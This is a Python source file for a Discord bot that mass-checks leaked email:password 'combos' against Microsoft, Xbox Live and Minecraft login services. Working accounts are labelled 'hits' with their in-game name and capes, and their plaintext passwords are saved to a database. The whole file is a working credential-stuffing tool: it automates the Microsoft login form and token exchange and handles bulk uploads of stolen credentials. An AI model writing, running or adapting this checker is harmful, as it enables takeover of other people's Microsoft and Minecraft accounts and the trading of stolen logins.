import discord
from discord.ext import commands
import requests
import re
import os
import time
import json
import sqlite3
import asyncio
import io
import os
from datetime import datetime
from urllib.parse import urlparse, parse_qs

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings()

# ==================== CONFIGURATION ====================
TOKEN = os.getenv("TOKEN") # Replace with your bot token
PREFIX = "!"

# Database setup
conn = sqlite3.connect('msmc_bot.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS checks
             (user_id INTEGER, email TEXT, password TEXT, ign TEXT, 
              status TEXT, timestamp TEXT, result TEXT)''')
conn.commit()

# ==================== AUTHENTICATION FUNCTIONS ====================
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def get_urlPost_sFTTag(session):
    """Extract login page tokens"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            text = session.get(sFTTag_url, timeout=15).text
            
            # Try different regex patterns for sFTTag
            patterns = [
                r'value=\\\"(.+?)\\\"',
                r'value="(.+?)"',
                r'name="PPFT"\s+value="(.+?)"'
            ]
            
            sFTTag = None
            for pattern in patterns:
                match = re.search(pattern, text, re.S)
                if match:
                    sFTTag = match.group(1)
                    break
            
            if sFTTag:
                # Extract urlPost
                url_patterns = [
                    r'"urlPost":"(.+?)"',
                    r"urlPost:'(.+?)'",
                    r'<form[^>]+action="([^"]+)"'
                ]
                
                for pattern in url_patterns:
                    match = re.search(pattern, text, re.S)
                    if match:
                        return match.group(1), sFTTag, session
                        
        except Exception as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            time.sleep(1)
    
    return None, None, session

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    """Submit credentials and get RPS token"""
    try:
        data = {
            'login': email, 
            'loginfmt': email, 
            'passwd': password, 
            'PPFT': sFTTag
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        login_request = session.post(urlPost, data=data, headers=headers, 
                                     allow_redirects=True, timeout=15)
        
        # Check for success (access_token in fragment)
        if '#' in login_request.url:
            fragment = urlparse(login_request.url).fragment
            token = parse_qs(fragment).get('access_token', ["None"])[0]
            if token != "None":
                return token, session
        
        # Check for 2FA
        if any(x in login_request.text.lower() for x in ['twofactor', '2fa', 'cancel?mkt=', 'recover?mkt']):
            return "2FA", session
        
        # Check for bad credentials
        if any(x in login_request.text.lower() for x in ['password is incorrect', "account doesn't exist", 
                                                         "that password is incorrect", "sign in to your microsoft"]):
            return "BAD", session
        
        return "BAD", session
        
    except Exception as e:
        print(f"Login error: {e}")
        return "BAD", session

def get_xsts_token(session, rps_token):
    """Exchange RPS token for XSTS token"""
    try:
        # Get Xbox Live token
        xbl_login = session.post('https://user.auth.xboxlive.com/user/authenticate',
                                  json={
                                      "Properties": {
                                          "AuthMethod": "RPS", 
                                          "SiteName": "user.auth.xboxlive.com",
                                          "RpsTicket": rps_token
                                      },
                                      "RelyingParty": "http://auth.xboxlive.com", 
                                      "TokenType": "JWT"
                                  },
                                  headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                  timeout=15)
        
        if xbl_login.status_code != 200:
            return None, None
            
        xbl_json = xbl_login.json()
        xbl_token = xbl_json.get('Token')
        if not xbl_token:
            return None, None
            
        uhs = xbl_json['DisplayClaims']['xui'][0]['uhs']
        
        # Get XSTS token for Minecraft
        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                            json={
                                "Properties": {
                                    "SandboxId": "RETAIL", 
                                    "UserTokens": [xbl_token]
                                },
                                "RelyingParty": "rp://api.minecraftservices.com/", 
                                "TokenType": "JWT"
                            },
                            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                            timeout=15)
        
        if xsts.status_code != 200:
            return None, None
            
        xsts_json = xsts.json()
        xsts_token = xsts_json.get('Token')
        
        if xsts_token:
            return uhs, xsts_token
        return None, None
        
    except Exception as e:
        print(f"XSTS error: {e}")
        return None, None

def get_minecraft_token(session, uhs, xsts_token):
    """Exchange XSTS token for Minecraft access token"""
    try:
        mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                                headers={'Content-Type': 'application/json'}, 
                                timeout=15)
        
        if mc_login.status_code == 200:
            return mc_login.json().get('access_token')
        return None
        
    except Exception as e:
        print(f"Minecraft token error: {e}")
        return None

def get_minecraft_profile(session, mc_token):
    """Retrieve Minecraft profile (IGN and capes)"""
    headers = {'Authorization': f'Bearer {mc_token}'}
    try:
        resp = session.get('https://api.minecraftservices.com/minecraft/profile', 
                          headers=headers, timeout=15)
        
        if resp.status_code == 200:
            data = resp.json()
            ign = data.get('name', 'N/A')
            capes = data.get('capes', [])
            cape_names = [cape.get('alias', 'Unknown') for cape in capes if cape.get('alias')]
            capes_str = ", ".join(cape_names) if cape_names else "None"
            uuid = data.get('id', 'N/A')
            return ign, capes_str, uuid
        return None, None, None
        
    except Exception as e:
        print(f"Profile error: {e}")
        return None, None, None

def check_account(email, password):
    """Main function to check a single account"""
    session = requests.Session()
    session.verify = False
    
    try:
        # Step 1: Get login page tokens
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        if not urlPost or not sFTTag:
            return {"status": "error", "message": "Failed to load login page"}
        
        # Step 2: Login and get RPS token
        rps_token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        
        if rps_token == "BAD":
            return {"status": "bad", "message": "Invalid credentials"}
        elif rps_token == "2FA":
            return {"status": "2fa", "message": "2FA required - cannot automate"}
        
        # Step 3: Get XSTS token
        uhs, xsts_token = get_xsts_token(session, rps_token)
        if not uhs or not xsts_token:
            return {"status": "error", "message": "XSTS authentication failed"}
        
        # Step 4: Get Minecraft token
        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            return {"status": "valid_mail", "message": "Valid Microsoft account, no Minecraft"}
        
        # Step 5: Get profile
        ign, capes, uuid = get_minecraft_profile(session, mc_token)
        if ign:
            return {
                "status": "hit",
                "ign": ign,
                "capes": capes,
                "uuid": uuid,
                "message": f"✅ **HIT!**\nIGN: {ign}\nCapes: {capes}\nUUID: {uuid}"
            }
        else:
            return {"status": "error", "message": "Profile fetch failed"}
            
    except Exception as e:
        return {"status": "error", "message": str(e)}
    finally:
        session.close()

# ==================== DISCORD BOT ====================
bot = commands.Bot(command_prefix=PREFIX, intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    await bot.change_presence(activity=discord.Game(name=f"{PREFIX}help | Account Checker"))

@bot.command(name="check", aliases=["c"], help="Check a single account: !check email:password")
async def check_single(ctx, credentials: str = None):
    """Check a single Microsoft account"""
    if not credentials:
        embed = discord.Embed(
            title="❌ Invalid Usage",
            description=f"Please use: `{PREFIX}check email:password`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    if ":" not in credentials:
        embed = discord.Embed(
            title="❌ Invalid Format",
            description="Please use: `email:password`\nExample: `test@gmail.com:password123`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    email, password = credentials.split(":", 1)
    
    # Send initial message
    msg = await ctx.send(f"🔍 Checking `{email}`...")
    
    # Run check in thread
    def check_thread():
        return check_account(email, password)
    
    result = await asyncio.get_event_loop().run_in_executor(None, check_thread)
    
    # Create embed based on result
    embed = discord.Embed(title="Account Check Result", color=discord.Color.blue())
    embed.add_field(name="Email", value=email, inline=False)
    
    if result["status"] == "hit":
        embed.color = discord.Color.green()
        embed.add_field(name="Status", value="✅ HIT - Minecraft Account", inline=True)
        embed.add_field(name="IGN", value=result["ign"], inline=True)
        embed.add_field(name="Capes", value=result["capes"], inline=False)
        embed.add_field(name="UUID", value=result["uuid"], inline=False)
        
        # Save to database
        c.execute("INSERT INTO checks VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (ctx.author.id, email, password, result["ign"], "hit", 
                   datetime.now().isoformat(), json.dumps(result)))
        conn.commit()
        
    elif result["status"] == "valid_mail":
        embed.color = discord.Color.gold()
        embed.add_field(name="Status", value="📧 Valid Microsoft Account (No Minecraft)", inline=True)
        
        c.execute("INSERT INTO checks VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (ctx.author.id, email, password, "N/A", "valid_mail",
                   datetime.now().isoformat(), json.dumps(result)))
        conn.commit()
        
    elif result["status"] == "2fa":
        embed.color = discord.Color.orange()
        embed.add_field(name="Status", value="🔐 2FA Required", inline=True)
        embed.add_field(name="Note", value="This account requires two-factor authentication", inline=False)
        
    elif result["status"] == "bad":
        embed.color = discord.Color.red()
        embed.add_field(name="Status", value="❌ BAD - Invalid Credentials", inline=True)
        
    else:
        embed.color = discord.Color.red()
        embed.add_field(name="Status", value="⚠️ Error", inline=True)
        embed.add_field(name="Error", value=result["message"], inline=False)
    
    await msg.edit(content=None, embed=embed)

@bot.command(name="masscheck", aliases=["mc"], help="Mass check accounts from a file")
async def mass_check(ctx):
    """Mass check accounts from an uploaded file"""
    if not ctx.message.attachments:
        embed = discord.Embed(
            title="❌ No File Uploaded",
            description=f"Please upload a `.txt` file with credentials (one per line: email:password)",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    attachment = ctx.message.attachments[0]
    
    if not attachment.filename.endswith('.txt'):
        embed = discord.Embed(
            title="❌ Invalid File Type",
            description="Please upload a `.txt` file",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Download and parse file
    try:
        file_content = await attachment.read()
        lines = file_content.decode('utf-8').splitlines()
    except:
        embed = discord.Embed(
            title="❌ File Read Error",
            description="Could not read the file. Please ensure it's a valid text file.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Filter valid lines
    combos = []
    for line in lines:
        line = line.strip()
        if line and ':' in line:
            combos.append(line)
    
    if not combos:
        embed = discord.Embed(
            title="❌ No Valid Credentials",
            description="No valid `email:password` lines found in the file",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Start checking
    msg = await ctx.send(f"🔍 Starting mass check of {len(combos)} accounts...")
    
    results = {"hits": [], "valid_mail": [], "bad": [], "2fa": [], "errors": []}
    
    for i, combo in enumerate(combos, 1):
        email, password = combo.split(":", 1)
        
        def check_thread():
            return check_account(email, password)
        
        result = await asyncio.get_event_loop().run_in_executor(None, check_thread)
        
        if result["status"] == "hit":
            results["hits"].append(f"{combo} | IGN: {result['ign']} | Capes: {result['capes']}")
        elif result["status"] == "valid_mail":
            results["valid_mail"].append(combo)
        elif result["status"] == "2fa":
            results["2fa"].append(combo)
        elif result["status"] == "bad":
            results["bad"].append(combo)
        else:
            results["errors"].append(combo)
        
        # Update progress every 10 accounts
        if i % 10 == 0 or i == len(combos):
            await msg.edit(content=f"🔍 Checking... {i}/{len(combos)} | Hits: {len(results['hits'])} | Valid: {len(results['valid_mail'])}")
    
    # Create result embed
    embed = discord.Embed(title="📊 Mass Check Results", color=discord.Color.blue())
    embed.add_field(name="Total", value=str(len(combos)), inline=True)
    embed.add_field(name="✅ Hits", value=str(len(results["hits"])), inline=True)
    embed.add_field(name="📧 Valid Mail", value=str(len(results["valid_mail"])), inline=True)
    embed.add_field(name="🔐 2FA", value=str(len(results["2fa"])), inline=True)
    embed.add_field(name="❌ Bad", value=str(len(results["bad"])), inline=True)
    embed.add_field(name="⚠️ Errors", value=str(len(results["errors"])), inline=True)
    
    # Create results file
    output_lines = []
    if results["hits"]:
        output_lines.append("=== HITS ===\n" + "\n".join(results["hits"]))
    if results["valid_mail"]:
        output_lines.append("\n=== VALID MICROSOFT ACCOUNTS (No Minecraft) ===\n" + "\n".join(results["valid_mail"]))
    if results["2fa"]:
        output_lines.append("\n=== 2FA REQUIRED ===\n" + "\n".join(results["2fa"]))
    if results["bad"]:
        output_lines.append("\n=== BAD CREDENTIALS ===\n" + "\n".join(results["bad"]))
    
    if output_lines:
        file_content = "\n".join(output_lines)
        file = discord.File(io.StringIO(file_content), filename="results.txt")
        await ctx.send(embed=embed, file=file)
    else:
        await ctx.send(embed=embed)

@bot.command(name="stats", help="Show your check statistics")
async def stats(ctx):
    """Show user's check statistics"""
    c.execute("SELECT status, COUNT(*) FROM checks WHERE user_id = ? GROUP BY status", (ctx.author.id,))
    results = c.fetchall()
    
    if not results:
        embed = discord.Embed(
            title="📊 Statistics",
            description="You haven't checked any accounts yet!",
            color=discord.Color.blue()
        )
        await ctx.send(embed=embed)
        return
    
    embed = discord.Embed(title=f"📊 Statistics for {ctx.author.name}", color=discord.Color.blue())
    
    status_names = {
        "hit": "✅ Hits",
        "valid_mail": "📧 Valid Mail",
        "bad": "❌ Bad",
        "2fa": "🔐 2FA"
    }
    
    total = 0
    for status, count in results:
        name = status_names.get(status, status)
        embed.add_field(name=name, value=str(count), inline=True)
        total += count
    
    embed.add_field(name="Total", value=str(total), inline=True)
    embed.set_footer(text="Use !check to check more accounts!")
    
    await ctx.send(embed=embed)

@bot.command(name="help", aliases=["h"], help="Show this help message")
async def help_command(ctx):
    """Show help menu"""
    embed = discord.Embed(
        title="🎮 MSMC Discord Bot - Minecraft Account Checker",
        description="Check Microsoft accounts for Minecraft ownership",
        color=discord.Color.green()
    )
    
    embed.add_field(
        name=f"{PREFIX}check email:password",
        value="Check a single account\nExample: `!check test@gmail.com:password123`",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}masscheck",
        value="Check multiple accounts (upload a .txt file with one email:password per line)",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}stats",
        value="Show your personal check statistics",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}help",
        value="Show this help message",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}test",
        value="Test if the bot is working",
        inline=False
    )
    
    embed.set_footer(text="Made for Minecraft account checking | Results are saved in database")
    
    await ctx.send(embed=embed)

@bot.command(name="test", help="Test if bot is working")
async def test(ctx):
    """Simple test command"""
    embed = discord.Embed(
        title="✅ Bot is Working!",
        description=f"Use `{PREFIX}help` for available commands",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

# Error handling
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embed = discord.Embed(
            title="❌ Command Not Found",
            description=f"Use `{PREFIX}help` for available commands",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    elif isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(
            title="❌ Missing Argument",
            description=f"Use `{PREFIX}help` for correct usage",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="❌ Error",
            description=f"An error occurred: {str(error)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        print(error)

# ==================== RUN BOT ====================
if __name__ == "__main__":
    # Check for token
    if TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("="*50)
        print("⚠️  DISCORD BOT TOKEN REQUIRED")
        print("="*50)
        print("\nTo set up your bot:")
        print("1. Go to https://discord.com/developers/applications")
        print("2. Click 'New Application' and give it a name")
        print("3. Go to the 'Bot' section")
        print("4. Click 'Add Bot' and then 'Reset Token'")
        print("5. Copy the token and paste it in the script")
        print("\nReplace 'YOUR_BOT_TOKEN_HERE' with your actual token")
        print("="*50)
        exit(1)
    
    # Run the bot
    print("Starting MSMC Discord Bot...")
    bot.run(TOKEN)
